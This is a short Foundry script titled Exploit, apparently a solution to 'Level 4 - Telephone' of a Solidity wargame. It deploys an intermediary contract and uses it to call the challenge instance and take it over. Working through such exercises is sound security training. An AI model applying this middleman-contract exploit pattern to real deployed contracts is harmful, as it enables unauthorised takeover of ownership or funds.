// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";
import {TelephoneMiddleman} from "../src/Level4.sol";

// ================================================================
// │                      LEVEL 4 - TELEPHONE                     │
// ================================================================
contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();

        vm.startBroadcast();
        TelephoneMiddleman telephoneMiddleman = new TelephoneMiddleman();
        telephoneMiddleman.run(targetContractAddress);
        vm.stopBroadcast();
    }
}
